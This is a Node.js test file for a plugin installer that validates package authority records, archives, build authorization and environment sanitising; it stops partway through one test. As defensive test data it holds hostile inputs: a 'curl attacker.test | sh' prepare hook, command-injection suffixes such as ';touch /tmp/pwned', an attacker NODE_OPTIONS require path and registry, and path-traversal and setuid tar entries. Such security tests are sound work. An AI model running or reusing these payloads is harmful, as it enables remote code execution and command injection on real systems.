import assert from 'node:assert/strict';
import { createHash, randomBytes } from 'node:crypto';
import { spawnSync } from 'node:child_process';
import {
  lstat,
  mkdir,
  mkdtemp,
  readFile,
  realpath,
  rm,
  writeFile,
} from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import test from 'node:test';
import { gzipSync } from 'node:zlib';

import {
  loadAuthority,
  loadSchema,
  lifecycleHooksFromManifest,
  lifecycleHooksSha256,
  resolveItems,
  validateAuthority,
  validateItem,
} from '../skills/dsh-plugin-installer/scripts/authority.mjs';
import {
  inspectTarEntries,
  validateHostedArtifact,
  validateUpstreamArtifact,
} from '../skills/dsh-plugin-installer/scripts/archive-policy.mjs';
import {
  assertPrivateRecoveryPlatform,
  bindRecoverySourceToAuthority,
  buildChildEnvironment,
  buildDshInvocation,
  buildPlan,
  buildRecoveryAuthentication,
  buildRecoveryPlan,
  buildRemovalPlan,
  executeRecoveryTransaction,
  executeRemovalTransaction,
  executeTransaction,
  loadRecoveryKey,
  loadRecoverySource,
  parseDumpConfigEntries,
  parsePluginInventory,
  preflightPrepared,
  runAtomicAcceptanceBoundary,
  verifyRuntimeAcceptanceEvidence,
} from '../skills/dsh-plugin-installer/scripts/install-transaction.mjs';
import {
  authorizePrepareText,
  verifyEffectivePnpmBuildPolicy,
} from '../skills/dsh-plugin-installer/scripts/prepare-authorization.mjs';
import {
  captureProfileClosure,
  verifyProfileClosure,
} from '../skills/dsh-plugin-installer/scripts/profile-closure.mjs';
import {
  createProfileSnapshot,
  restoreProfileSnapshot,
} from '../skills/dsh-plugin-installer/scripts/profile-snapshot.mjs';
import {
  prepareHosted,
  prepareUpstream,
  validatePrepared,
} from '../skills/dsh-plugin-installer/scripts/prepare-plugin.mjs';
import {
  createPrivatePnpmBinding,
  pnpmCommandShimShell,
  requiresPnpmCommandShimShell,
  resolvePnpmExecutable,
} from '../skills/dsh-plugin-installer/scripts/pnpm-binding.mjs';
import {
  itemAuthoritySha256,
  loadTop10Schema,
  releaseSetPayloadSha256,
  validateTop10ReleaseSet,
} from '../skills/dsh-plugin-installer/scripts/top10-authority.mjs';
import {
  secureWindowsPrivatePath,
  WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT,
  WINDOWS_PRIVATE_ACL_TIMEOUT_MS,
} from '../skills/dsh-plugin-installer/scripts/windows-private-acl.mjs';

function sha256(bytes) {
  return createHash('sha256').update(bytes).digest('hex');
}

function stable(value) {
  if (Array.isArray(value)) return value.map(stable);
  if (value !== null && typeof value === 'object') {
    return Object.fromEntries(Object.keys(value).sort().map((key) => [key, stable(value[key])]));
  }
  return value;
}

function integrity(digest) {
  return `sha256-${Buffer.from(digest, 'hex').toString('base64')}`;
}

function sha512Integrity(bytes) {
  return `sha512-${createHash('sha512').update(bytes).digest('base64')}`;
}

function tar(entries, { compress = true } = {}) {
  const blocks = [];
  for (const entry of entries) {
    const body = Buffer.from(entry.body ?? '');
    const header = Buffer.alloc(512);
    header.write(entry.name, 0, 'utf8');
    const writeOctal = (value, offset, length) => {
      header.write(`${value.toString(8).padStart(length - 1, '0')}\0`, offset, 'ascii');
    };
    writeOctal(entry.mode ?? 0o644, 100, 8);
    writeOctal(0, 108, 8);
    writeOctal(0, 116, 8);
    writeOctal(body.length, 124, 12);
    writeOctal(0, 136, 12);
    header.fill(0x20, 148, 156);
    header[156] = (entry.type ?? '0').charCodeAt(0);
    header.write('ustar\0', 257, 'ascii');
    header.write('00', 263, 'ascii');
    const checksum = header.reduce((sum, byte) => sum + byte, 0);
    header.write(`${checksum.toString(8).padStart(6, '0')}\0 `, 148, 'ascii');
    blocks.push(header, body, Buffer.alloc((512 - (body.length % 512)) % 512));
  }
  blocks.push(Buffer.alloc(1024));
  const bytes = Buffer.concat(blocks);
  return compress ? gzipSync(bytes, { level: 9, mtime: 0 }) : bytes;
}

function lifecycle(scripts = {}) {
  const hooks = lifecycleHooksFromManifest({ scripts });
  return {
    hooks,
    hooksSha256: lifecycleHooksSha256(hooks),
    transitiveDependencyRisk: 'pnpm-may-run-transitive-dependency-lifecycle-scripts',
  };
}

function runtimeAcceptance(id, name, version) {
  return {
    schemaVersion: 1,
    dumpConfig: {
      kind: 'exact-cordis-entry',
      entryId: `fixture-${id}`,
      packageName: name,
      occurrence: 'exactly-one',
    },
    functionalProbe: {
      kind: 'cold-web-start-with-plugin-inventory',
      packageName: name,
      version,
      unauthenticatedRootStatus: 401,
    },
  };
}

function hostedFixture({ id = 3006, slug = 'fixture-hosted', name = 'dsh-fixture-hosted' } = {}) {
  const version = '1.0.0';
  const bundlePatch = 'cordis.patch.yml';
  const license = Buffer.from('MIT License\n');
  const manifest = Buffer.from(`${JSON.stringify({
    name,
    version,
    dsh: { bundle: { patch: bundlePatch } },
  })}\n`);
  const manifestSha256 = sha256(manifest);
  const bomRef = `pkg:npm/${name.startsWith('@') ? `%40${name.slice(1)}` : name}@${version}`;
  const component = {
    type: 'library',
    name,
    version,
    purl: bomRef,
    'bom-ref': bomRef,
    hashes: [{ alg: 'SHA-256', content: manifestSha256 }],
  };
  const sbom = Buffer.from(`${JSON.stringify({
    bomFormat: 'CycloneDX',
    specVersion: '1.6',
    version: 1,
    metadata: { component },
    components: [component],
    dependencies: [{ ref: bomRef, dependsOn: [] }],
  })}\n`);
  const bytes = tar([
    {
      name: 'package/package.json',
      body: manifest,
    },
    { name: `package/${bundlePatch}`, body: '[]\n' },
    { name: 'package/LICENSE', body: license },
    { name: 'package/SBOM.cdx.json', body: sbom },
  ]);
  const digest = sha256(bytes);
  return {
    bytes,
    item: {
      catalogId: id,
      slug,
      title: `Fixture ${id}`,
      status: 'verified-installable',
      profile: 'web',
      distribution: {
        kind: 'hosted-plugin-verified',
        assetName: `${slug}-${version}.tgz`,
        artifactUrl: `https://github.com/LvvUP/dsh-themes-skills/releases/download/v0.8.0/${slug}-${version}.tgz`,
        artifactBytes: bytes.length,
        artifactSha256: digest,
        artifactIntegrity: integrity(digest),
        manifestSha256,
        licenseFile: { path: 'LICENSE', sha256: sha256(license) },
        sbom: {
          format: 'cyclonedx-json',
          path: 'SBOM.cdx.json',
          sha256: sha256(sbom),
        },
      },
      package: {
        name,
        version,
        bundlePatch,
        lifecycleAuthorization: {
          required: false,
          packageKey: null,
          authorizedHooks: [],
          hooksSha256: null,
        },
        lifecycle: lifecycle(),
      },
      safety: {
        consentRequired: true,
        permissions: ['Reads the active workspace after user approval.'],
        network: [],
        processes: [],
        files: ['Writes only its DSH profile package state.'],
      },
      rights: {
        licenseExpression: 'MIT',
        sourceUrl: 'https://github.com/example/plugin',
        redistribution: 'allowed',
      },
      rollback: { removePackageName: name, coldRestartRequired: true },
      runtimeAcceptance: runtimeAcceptance(id, name, version),
      receipts: {
        status: 'verified',
        runtimeReceiptSha256: 'a'.repeat(64),
        platformNodeMatrixSha256: 'b'.repeat(64),
      },
    },
  };
}

function upstreamBase({ id, slug, name, version, source, scripts = {} }) {
  const packageLifecycle = lifecycle(scripts);
  const authorizedHooks = Object.keys(packageLifecycle.hooks)
    .filter((hook) => packageLifecycle.hooks[hook] !== null);
  return {
    catalogId: id,
    slug,
    title: `Fixture ${slug}`,
    status: 'verified-installable',
    profile: 'web',
    distribution: {
      kind: 'upstream-plugin-verified',
      source,
    },
    package: {
      name,
      version,
      bundlePatch: 'cordis.patch.yml',
      lifecycle: packageLifecycle,
      lifecycleAuthorization: {
        required: authorizedHooks.length > 0,
        packageKey: authorizedHooks.length > 0 ? name : null,
        authorizedHooks,
        hooksSha256: authorizedHooks.length > 0 ? packageLifecycle.hooksSha256 : null,
      },
    },
    safety: {
      consentRequired: true,
      permissions: ['Runs reviewed workspace tools.'],
      network: ['Connects only to api.example.test.'],
      processes: ['Runs its exact prepare build after consent.'],
      files: ['Writes generated lib files during prepare.'],
    },
    rights: {
      licenseExpression: 'Apache-2.0',
      sourceUrl: 'https://github.com/example/plugin',
      redistribution: 'upstream-only',
    },
    rollback: {
      removePackageName: name,
      coldRestartRequired: true,
    },
    runtimeAcceptance: runtimeAcceptance(id, name, version),
    receipts: {
      status: 'verified',
      runtimeReceiptSha256: 'f'.repeat(64),
      platformNodeMatrixSha256: '1'.repeat(64),
    },
  };
}

function gitFixture() {
  const commit = 'c'.repeat(40);
  const repository = 'https://github.com/example/plugin.git';
  return upstreamBase({
    id: 3052,
    slug: 'fixture-git-upstream',
    name: '@example/dsh-plugin',
    version: '1.2.3',
    scripts: {
      prepare: 'pnpm run build',
      install: 'node install.js',
      postinstall: 'node postinstall.js',
    },
    source: {
      type: 'git-commit',
      repository,
      commit,
      tree: 'd'.repeat(40),
      subdir: '.',
      installSpec: `git+${repository}#${commit}`,
      manifestSha256: 'e'.repeat(64),
      lockfilePath: 'pnpm-lock.yaml',
      lockfileSha256: '2'.repeat(64),
    },
  });
}

function upstreamArtifactFixture({ type = 'npm-package-version' } = {}) {
  const id = type === 'npm-package-version' ? 3041 : 3033;
  const slug = type === 'npm-package-version' ? 'fixture-npm-upstream' : 'fixture-release-upstream';
  const name = type === 'npm-package-version' ? '@example/npm-plugin' : '@example/release-plugin';
  const version = '2.3.4';
  const scripts = { postinstall: 'node postinstall.js' };
  const manifestBytes = Buffer.from(`${JSON.stringify({
    name,
    version,
    scripts,
    dsh: { bundle: { patch: 'cordis.patch.yml' } },
  })}\n`);
  const bytes = tar([
    { name: 'package/package.json', body: manifestBytes },
    { name: 'package/cordis.patch.yml', body: '[]\n' },
  ]);
  let source;
  let metadataBytes = null;
  if (type === 'npm-package-version') {
    const tarballUrl = 'https://registry.npmjs.org/@example/npm-plugin/-/npm-plugin-2.3.4.tgz';
    const distIntegrity = sha512Integrity(bytes);
    metadataBytes = Buffer.from(`${JSON.stringify({
      name,
      versions: {
        [version]: { name, version, dist: { tarball: tarballUrl, integrity: distIntegrity } },
      },
    })}\n`);
    source = {
      type,
      registry: 'https://registry.npmjs.org',
      packageName: name,
      version,
      installSpec: `${name}@${version}`,
      metadataSha256: sha256(metadataBytes),
      tarballUrl,
      tarballBytes: bytes.length,
      tarballSha256: sha256(bytes),
      distIntegrity,
    };
  } else {
    source = {
      type,
      repository: 'https://github.com/example/plugin',
      tag: 'v2.3.4',
      assetName: 'release-plugin-2.3.4.tgz',
      assetUrl: 'https://github.com/example/plugin/releases/download/v2.3.4/release-plugin-2.3.4.tgz',
      assetBytes: bytes.length,
      assetSha256: sha256(bytes),
      assetIntegrity: integrity(sha256(bytes)),
      manifestSha256: sha256(manifestBytes),
    };
  }
  return {
    bytes,
    metadataBytes,
    item: upstreamBase({ id, slug, name, version, source, scripts }),
  };
}

function validationOptions(loaded) {
  return {
    harnessAuthorityBytes: loaded.harnessAuthorityBytes,
    top10ReleaseSetBytes: loaded.top10ReleaseSetBytes,
  };
}

function promotedContext(loaded, items) {
  const authority = structuredClone(loaded.authority);
  authority.harness.runtimeStatus = 'runtime-receipt-verified';
  authority.harness.runtimeReceiptSetSha256 = '9'.repeat(64);
  authority.harness.installable = true;
  authority.publication.status = 'verified-installable';
  authority.publication.publishedInstallable = true;
  authority.publication.verifiedInstallableCount = 80;
  authority.publication.authorityItemCount = 80;
  authority.items = items;
  const releaseSet = structuredClone(loaded.top10ReleaseSet);
  releaseSet.status = 'verified-frozen';
  releaseSet.frozen = true;
  releaseSet.scoring.coverageStatus = 'verified';
  const top10Ids = [3006, 3052, 3041, 3033, 3040, 3044, 3036, 3010, 3038, 3045];
  const useCases = [
    'automation',
    'communication',
    'data-and-analysis',
    'developer-workflow',
    'files-and-content',
    'knowledge-retrieval',
    'observability',
    'productivity',
  ];
  releaseSet.entries = top10Ids.map((catalogId, index) => {
    const item = items.find((candidate) => candidate.catalogId === catalogId);
    const scores = {
      userValueAndUseCaseClarity: 25,
      stabilityMaintenanceAndAlpha1Fit: 25,
      securityAndPermissionRestraint: 15,
      crossPlatformInstallRemoveRollback: 15,
      nonTechnicalUsabilityAndDocs: 10,
      combinationComplementarity: 10 - index,
    };
    return {
      rank: index + 1,
      publicId: `#${catalogId}`,
      catalogId,
      itemAuthoritySha256: itemAuthoritySha256(item),
      useCaseCategories: [useCases[index % useCases.length]],
      scores,
      totalScore: Object.values(scores).reduce((sum, score) => sum + score, 0),
      maintenanceActivityAt: '2026-08-30',
      maintenanceActivityReceiptSha256: sha256(Buffer.from(`maintenance-${catalogId}`)),
    };
  });
  releaseSet.scoring.coveredUseCaseCategories = [...new Set(
    releaseSet.entries.flatMap((entry) => entry.useCaseCategories)
  )].sort();
  releaseSet.gate = {
    requiredPublishedPluginCount: 80,
    verifiedPluginCount: 80,
    requiredMatrixTasksPerItem: 6,
    verifiedMatrixTasksPerItem: 6,
    itemAuthorityComplete: true,
    allEightyVerified: true,
    sixTaskMatrixVerified: true,
    transactionPreflightVerified: true,
    transactionRollbackVerified: true,
    webCoexistenceVerified: true,
    conflictMatrixVerified: true,
    transactionPreflightReceiptSha256: '6'.repeat(64),
    transactionRollbackReceiptSha256: '7'.repeat(64),
    webCoexistenceReceiptSha256: '8'.repeat(64),
    conflictMatrixReceiptSha256: '5'.repeat(64),
    itemAuthoritySetSha256: sha256(Buffer.from(`${JSON.stringify(releaseSet.entries.map((entry) => ({
      catalogId: entry.catalogId,
      itemAuthoritySha256: entry.itemAuthoritySha256,
    })))}\n`)),
    platformNodeMatrixSetSha256: sha256(Buffer.from(`${JSON.stringify(releaseSet.entries.map((entry) => ({
      catalogId: entry.catalogId,
      platformNodeMatrixSha256: items.find((item) => item.catalogId === entry.catalogId).receipts.platformNodeMatrixSha256,
    })))}\n`)),
  };
  releaseSet.releaseSetPayloadSha256 = releaseSetPayloadSha256(releaseSet);
  const top10ReleaseSetBytes = Buffer.from(`${JSON.stringify(releaseSet, null, 2)}\n`);
  authority.top10ReleaseSet.sha256 = sha256(top10ReleaseSetBytes);
  return {
    authority,
    top10ReleaseSet: releaseSet,
    top10ReleaseSetBytes,
    validationOptions: {
      harnessAuthorityBytes: loaded.harnessAuthorityBytes,
      top10ReleaseSetBytes,
    },
  };
}

function fullItemSet(overrides = []) {
  const byId = new Map(overrides.map((item) => [item.catalogId, item]));
  return Array.from({ length: 80 }, (_, offset) => {
    const id = 3000 + offset;
    return byId.get(id) ?? hostedFixture({
      id,
      slug: `fixture-${id}`,
      name: `dsh-fixture-${id}`,
    }).item;
  });
}

async function workspace(t) {
  const root = await mkdtemp(join(tmpdir(), 'dsh-plugin-installer-'));
  t.after(() => rm(root, { recursive: true, force: true }));
  return root;
}

function completeRollback() {
  return {
    attempted: true,
    filesRestored: true,
    closureRestored: true,
    inventoryRestored: true,
    coldStartProbePassed: true,
  };
}

test('current Plugin authority exposes 80 curated records but zero installation authority', async () => {
  const loaded = await loadAuthority();
  assert.equal(
    loaded.authoritySha256,
    '40d504f2b93adb154e721509e6cd24b9e228e7b5dd901af66934051e77870596'
  );
  assert.equal(loaded.authority.publication.publishedCatalogPluginCount, 80);
  assert.equal(loaded.authority.publication.requiredVerifiedInstallableCount, 80);
  assert.equal(loaded.authority.publication.verifiedInstallableCount, 0);
  assert.equal(loaded.authority.items.length, 0);
  assert.equal(loaded.authority.harness.installable, false);
  assert.equal(loaded.top10ReleaseSet.frozen, false);
  assert.equal(loaded.top10ReleaseSet.status, 'candidate-pending');
  assert.equal(loaded.top10ReleaseSet.gate.verifiedPluginCount, 0);
  assert.equal(loaded.top10ReleaseSet.gate.verifiedMatrixTasksPerItem, 0);
  assert.deepEqual(loaded.top10ReleaseSet.entries, []);
  assert.throws(
    () => resolveItems(loaded.authority, ['#3006'], {
      top10ReleaseSet: loaded.top10ReleaseSet,
      validationOptions: validationOptions(loaded),
    }),
    /evidence-pending/
  );
});

test('independent Top10 authority freezes scoring but fails closed until 80/80 six-task evidence', async () => {
  const loaded = await loadAuthority();
  assert.equal(validateTop10ReleaseSet(loaded.top10ReleaseSet).frozen, false);
  assert.deepEqual(Object.values(loaded.top10ReleaseSet.scoring.weights), [25, 25, 15, 15, 10, 10]);
  assert.deepEqual(loaded.top10ReleaseSet.scoring.coveredUseCaseCategories, []);
  assert.deepEqual(
    loaded.top10ReleaseSet.scoring.tieBreakOrder,
    ['stability-plus-security', 'maintenance-activity', 'lower-public-id']
  );
  assert.deepEqual(loaded.top10ReleaseSet.entries, []);

  const promoted = promotedContext(loaded, fullItemSet());
  assert.doesNotThrow(() => validateTop10ReleaseSet(promoted.top10ReleaseSet, {
    authority: promoted.authority,
  }));
  const tamperedOrder = structuredClone(promoted.top10ReleaseSet);
  [tamperedOrder.entries[0], tamperedOrder.entries[1]] = [tamperedOrder.entries[1], tamperedOrder.entries[0]];
  assert.throws(() => validateTop10ReleaseSet(tamperedOrder), /identity|rank|payload digest/);
  const premature = structuredClone(loaded.top10ReleaseSet);
  premature.frozen = true;
  premature.status = 'verified-frozen';
  premature.releaseSetPayloadSha256 = releaseSetPayloadSha256(premature);
  assert.throws(
    () => validateTop10ReleaseSet(premature, { authority: loaded.authority }),
    /80\/80 six-task gate/
  );
  const changedBytes = Buffer.from(loaded.top10ReleaseSetBytes);
  changedBytes[changedBytes.length - 2] = changedBytes[changedBytes.length - 2] === 0x20 ? 0x09 : 0x20;
  assert.throws(
    () => validateAuthority(loaded.authority, {
      harnessAuthorityBytes: loaded.harnessAuthorityBytes,
      top10ReleaseSetBytes: changedBytes,
    }),
    /exact Top10 release-set bytes/
  );
});

test('machine schema is closed and models hosted plus fixed upstream distributions', async () => {
  const schema = await loadSchema();
  const top10Schema = await loadTop10Schema();
  assert.equal(schema.additionalProperties, false);
  assert.equal(top10Schema.additionalProperties, false);
  assert.equal(schema.$defs.item.additionalProperties, false);
  assert.equal(schema.$defs.hostedDistribution.additionalProperties, false);
  assert.equal(schema.$defs.upstreamDistribution.additionalProperties, false);
  assert.equal(schema.$defs.lifecycleHooks.additionalProperties, false);
  assert.deepEqual(
    schema.properties.supportedDistributionKinds.const,
    ['hosted-plugin-verified', 'upstream-plugin-verified']
  );
  assert.equal(schema.$defs.item.properties.distribution.oneOf.length, 2);
  assert.equal(schema.$defs.upstreamDistribution.properties.source.oneOf.length, 3);
  assert.equal(schema.$defs.gitCommitSource.properties.subdir.const, '.');
  assert.equal(schema.$defs.publication.properties.publishedCatalogPluginCount.const, 80);
  assert.equal(schema.$defs.hostedDistribution.properties.sbom.additionalProperties, false);
  assert.equal(top10Schema.$defs.weights.properties.userValueAndUseCaseClarity.const, 25);
  assert.equal(top10Schema.$defs.weights.properties.stabilityMaintenanceAndAlpha1Fit.const, 25);
  assert.equal(top10Schema.$defs.scoring.properties.minimumUseCaseCategories.const, 8);
});

test('authority validator accepts exact hosted/upstream records and rejects command injection', async () => {
  const loaded = await loadAuthority();
  const hosted = hostedFixture().item;
  const git = gitFixture();
  const npm = upstreamArtifactFixture().item;
  const release = upstreamArtifactFixture({ type: 'github-release-asset' }).item;
  const promoted = promotedContext(loaded, fullItemSet([hosted, git, npm, release]));
  assert.doesNotThrow(() => validateAuthority(promoted.authority, promoted.validationOptions));
  const partial = structuredClone(promoted.authority);
  partial.items = [hosted, git];
  partial.publication.verifiedInstallableCount = 2;
  partial.publication.authorityItemCount = 2;
  assert.throws(() => validateAuthority(partial, promoted.validationOptions), /80|publication gate/i);

  const attacks = [
    (item) => { item.distribution.source.installSpec += ';touch /tmp/pwned'; },
    (item) => { item.distribution.source.repository = 'https://github.com/example/plugin.git?token=secret'; },
    (item) => { item.package.name = '@example/plugin;echo'; },
    (item) => { item.package.lifecycle.hooks.prepare += '\necho injected'; },
    (item) => { item.distribution.source.subdir = 'packages/plugin'; },
  ];
  for (const attack of attacks) {
    const changed = structuredClone(git);
    attack(changed);
    assert.throws(
      () => validateItem(changed),
      /unsafe|malformed|mismatch|path|authorization|credential-free|repository root|bounded/i
    );
  }

  for (const legacyKind of ['hosted-verified-artifact', 'upstream-source-verified']) {
    const changed = structuredClone(legacyKind.startsWith('hosted') ? hosted : git);
    changed.distribution.kind = legacyKind;
    assert.throws(() => validateItem(changed), /unsupported distribution kind/);
  }
  const npmTag = structuredClone(npm);
  npmTag.distribution.source.installSpec = `${npmTag.package.name}@latest`;
  assert.throws(() => validateItem(npmTag), /exact npm source|unsafe/i);
  const releaseLatest = structuredClone(release);
  releaseLatest.distribution.source.tag = 'latest';
  releaseLatest.distribution.source.assetUrl = releaseLatest.distribution.source.assetUrl.replace('v2.3.4', 'latest');
  assert.throws(() => validateItem(releaseLatest), /GitHub Release source/);
  const shortCommit = structuredClone(git);
  shortCommit.distribution.source.commit = 'c'.repeat(12);
  assert.throws(() => validateItem(shortCommit), /Git commit source/);
  const unknownSource = structuredClone(git);
  unknownSource.distribution.source.type = 'git-branch';
  assert.throws(() => validateItem(unknownSource), /source type is unsupported/);

  const invocation = buildDshInvocation('/absolute/dsh-bin.js', [
    'plugin', '--profile', 'web', 'add', '/private/plugin-deadbeef.tgz', '--save-exact',
  ]);
  assert.equal(invocation.shell, false);
  assert.equal(invocation.args.at(-2), '/private/plugin-deadbeef.tgz');
  const windowsInvocation = buildDshInvocation('C:\\Program Files\\nodejs\\dsh-bin.js', [
    'plugin', '--profile', 'web', 'add', 'C:\\Users\\Fixture User\\plugin.tgz', '--save-exact',
  ]);
  assert.equal(windowsInvocation.args.at(-2), 'C:\\Users\\Fixture User\\plugin.tgz');
  assert.throws(
    () => buildDshInvocation('/absolute/dsh-bin.js', [
      'plugin', '--profile', 'web', 'add', '/private/plugin.tgz;touch', '--save-exact',
    ]),
    /command-injection-safe grammar/
  );
  assert.throws(
    () => buildDshInvocation('/absolute/dsh-bin.js', ['plugin', 'bad\nargument']),
    /literal argument-array/
  );
  const list = buildDshInvocation('/absolute/dsh-bin.js', [
    'plugin', '--profile', 'web', 'list', '--json',
  ]);
  assert.equal(list.shell, false);
  const remove = buildDshInvocation('/absolute/dsh-bin.js', [
    'plugin', '--profile', 'web', 'remove', '@example/exact-plugin',
  ]);
  assert.equal(remove.shell, false);
  assert.equal(remove.args.at(-1), '@example/exact-plugin');
  assert.throws(
    () => buildDshInvocation('/absolute/dsh-bin.js', [
      'plugin', '--profile', 'web', 'remove', '@example/exact-plugin;touch',
    ]),
    /fixed add, remove, list/
  );
  const dump = buildDshInvocation('/absolute/dsh-bin.js', [
    '--profile', 'web', '--dump-config',
  ]);
  assert.equal(dump.shell, false);
  const childEnv = buildChildEnvironment('/private/dsh-home', '/private/runtime', {
    PATH: '/trusted/bin',
    HOME: '/private/home',
    LANG: 'en_US.UTF-8',
    NODE_OPTIONS: '--require=/tmp/attacker.cjs',
    npm_config_registry: 'https://attacker.test',
    PNPM_HOME: '/tmp/attacker',
    AWS_SECRET_ACCESS_KEY: 'never-inherit',
    GITHUB_TOKEN: 'never-inherit',
  });
  assert.equal(Object.isFrozen(childEnv), true);
  assert.equal(childEnv.HOME, join('/private/runtime', 'home'));
  assert.equal(childEnv.USERPROFILE, join('/private/runtime', 'home'));
  assert.equal(childEnv.NPM_CONFIG_USERCONFIG, join('/private/runtime', 'empty-npmrc'));
  assert.equal(childEnv.GIT_CONFIG_GLOBAL, join('/private/runtime', 'empty-gitconfig'));
  assert.equal(childEnv.LANG, 'en_US.UTF-8');
  assert.equal(childEnv.PATH, '/trusted/bin');
  assert.equal(childEnv.DSH_HOME, '/private/dsh-home');
  assert.equal(Object.hasOwn(childEnv, 'NODE_OPTIONS'), false);
  assert.equal(Object.hasOwn(childEnv, 'npm_config_registry'), false);
  assert.equal(Object.hasOwn(childEnv, 'AWS_SECRET_ACCESS_KEY'), false);
  assert.deepEqual(
    parsePluginInventory(JSON.stringify([{
      name: 'dsh-profile-web',
      private: true,
      dependencies: {
        zed: { from: 'zed', version: '2.0.0', path: '/private/not-retained' },
        alpha: { from: 'alpha', version: '1.0.0', path: '/private/not-retained' },
      },
    }])),
    { alpha: '1.0.0', zed: '2.0.0' }
  );
});

test('hosted archive binds SBOM/license and rejects lifecycle, traversal, polyglot tails, and dangerous metadata', () => {
  const fixture = hostedFixture();
  assert.equal(validateHostedArtifact(fixture.bytes, fixture.item).packageName, fixture.item.package.name);

  const changed = Buffer.from(fixture.bytes);
  changed[changed.length - 1] ^= 1;
  assert.throws(() => validateHostedArtifact(changed, fixture.item), /SHA-256 mismatch/);

  const lifecycleManifest = Buffer.from(JSON.stringify({
    name: fixture.item.package.name,
    version: fixture.item.package.version,
    scripts: { prepare: 'curl attacker.test | sh' },
    dsh: { bundle: { patch: fixture.item.package.bundlePatch } },
  }));
  const lifecycleBytes = tar([
    {
      name: 'package/package.json',
      body: lifecycleManifest,
    },
    { name: 'package/cordis.patch.yml', body: '[]\n' },
  ]);
  const lifecycleItem = structuredClone(fixture.item);
  lifecycleItem.distribution.artifactBytes = lifecycleBytes.length;
  lifecycleItem.distribution.artifactSha256 = sha256(lifecycleBytes);
  lifecycleItem.distribution.artifactIntegrity = integrity(sha256(lifecycleBytes));
  lifecycleItem.distribution.manifestSha256 = sha256(lifecycleManifest);
  assert.throws(() => validateHostedArtifact(lifecycleBytes, lifecycleItem), /forbidden prepare/);

  const traversal = tar([{ name: 'package/../escape', body: 'owned' }]);
  assert.throws(() => inspectTarEntries(traversal), /unsafe path/);
  const link = tar([{ name: 'package/link', body: '', type: '2' }]);
  assert.throws(() => inspectTarEntries(link), /forbidden link or special type/);
  const control = tar([{ name: 'package/bad\nname', body: 'owned' }]);
  assert.throws(() => inspectTarEntries(control), /unsafe path/);
  const dangerousMode = tar([{ name: 'package/tool', body: 'owned', mode: 0o4755 }]);
  assert.throws(() => inspectTarEntries(dangerousMode), /dangerous mode/);
  const collision = tar([
    { name: 'package/Readme', body: 'one' },
    { name: 'package/README', body: 'two' },
  ]);
  assert.throws(() => inspectTarEntries(collision), /case-colliding/);
  const raw = tar([{ name: 'package/file', body: 'ok' }], { compress: false });
  const tailed = Buffer.concat([raw, Buffer.alloc(512, 0x41)]);
  assert.throws(() => inspectTarEntries(tailed), /non-zero data after/);

  const wrongSbom = structuredClone(fixture.item);
  wrongSbom.distribution.sbom.sha256 = '0'.repeat(64);
  assert.throws(() => validateHostedArtifact(fixture.bytes, wrongSbom), /SBOM.*digest/i);
});

test('prepare authorization adds only exact reviewed package keys and preserves explicit denial', () => {
  const upstream = gitFixture();
  assert.deepEqual(
    upstream.package.lifecycleAuthorization.authorizedHooks,
    ['prepare', 'install', 'postinstall']
  );
  const base = 'packages:\n  - .\n\nnodeLinker: hoisted\nautoInstallPeers: false\n';
  const authorized = authorizePrepareText(base, [upstream]);
  assert.equal(authorized.changed, true);
  assert.deepEqual(authorized.keys, ['@example/dsh-plugin']);
  assert.match(authorized.source, /allowBuilds:\n  "@example\/dsh-plugin": true/);
  assert.throws(
    () => authorizePrepareText(`${base}\nallowBuilds:\n  "@example/dsh-plugin": false\n`, [upstream]),
    /explicitly denied/
  );
  assert.throws(
    () => authorizePrepareText(`${base}\nallowBuilds: { "@example/dsh-plugin": false }\n`, [upstream]),
    /explicitly denied/
  );
  assert.throws(
    () => authorizePrepareText(`${base}\n"allowBuilds":\n  "@example/dsh-plugin": false\n`, [upstream]),
    /explicitly denied/
  );
  assert.throws(
    () => authorizePrepareText(`${base}\nallowBuilds:\n  "@example/dsh-plugin": true\n"allowBuilds": {}\n`, [upstream]),
    /invalid|unique|map key/i
  );
  assert.throws(
    () => authorizePrepareText(`${base}\nshared: &shared\n  x: true\nallowBuilds: *shared\n`, [upstream]),
    /aliases are forbidden/
  );
  assert.throws(
    () => authorizePrepareText(`${base}\nallowBuilds:\n  <<: { "@example/dsh-plugin": true }\n`, [upstream]),
    /merge keys are forbidden/
  );
  const injected = structuredClone(upstream);
  injected.package.lifecycleAuthorization.packageKey = '@example/dsh-plugin;touch';
  assert.throws(() => authorizePrepareText(base, [injected]), /authorization|malformed/);
});

test('upstream preparation rejects an undisclosed standard lifecycle hook despite exact commit and manifest digests', async (t) => {
  const root = await workspace(t);
  const checkout = join(root, 'checkout');
  await mkdir(checkout);
  const item = gitFixture();
  const manifest = {
    name: item.package.name,
    version: item.package.version,
    scripts: {
      prepare: item.package.lifecycle.hooks.prepare,
      install: item.package.lifecycle.hooks.install,
      postinstall: item.package.lifecycle.hooks.postinstall,
      preinstall: 'node unexpected-preinstall.js',
    },
    dsh: { bundle: { patch: item.package.bundlePatch } },
  };
  const manifestBytes = Buffer.from(`${JSON.stringify(manifest, null, 2)}\n`);
  await writeFile(join(checkout, 'package.json'), manifestBytes);
  await writeFile(join(checkout, item.package.bundlePatch), '[]\n');
  const lockfileBytes = Buffer.from('lockfileVersion: 9.0\n');
  await writeFile(join(checkout, item.distribution.source.lockfilePath), lockfileBytes);
  const git = (...args) => {
    const result = spawnSync('git', ['-C', checkout, ...args], { encoding: 'utf8' });
    assert.equal(result.status, 0, result.stderr);
    return result.stdout.trim();
  };
  git('init', '-q');
  git('config', 'user.name', 'Fixture');
  git('config', 'user.email', 'fixture@example.invalid');
  git('remote', 'add', 'origin', item.distribution.source.repository);
  git('add', '.');
  git('commit', '-qm', 'fixture');
  item.distribution.source.commit = git('rev-parse', 'HEAD');
  item.distribution.source.tree = git('rev-parse', 'HEAD^{tree}');
  item.distribution.source.installSpec = `git+${item.distribution.source.repository}#${item.distribution.source.commit}`;
  item.distribution.source.manifestSha256 = sha256(manifestBytes);
  item.distribution.source.lockfileSha256 = sha256(lockfileBytes);
  await assert.rejects(
    () => prepareUpstream({ item, checkout, output: join(root, 'prepared') }),
    /lifecycle hook map/
  );
});

test('exact npm preparation binds package@version, registry metadata, tarball identity, and integrity', async (t) => {
  const root = await workspace(t);
  const fixture = upstreamArtifactFixture();
  const artifact = join(root, 'npm-plugin.tgz');
  const metadata = join(root, 'metadata.json');
  await writeFile(artifact, fixture.bytes);
  await writeFile(metadata, fixture.metadataBytes);
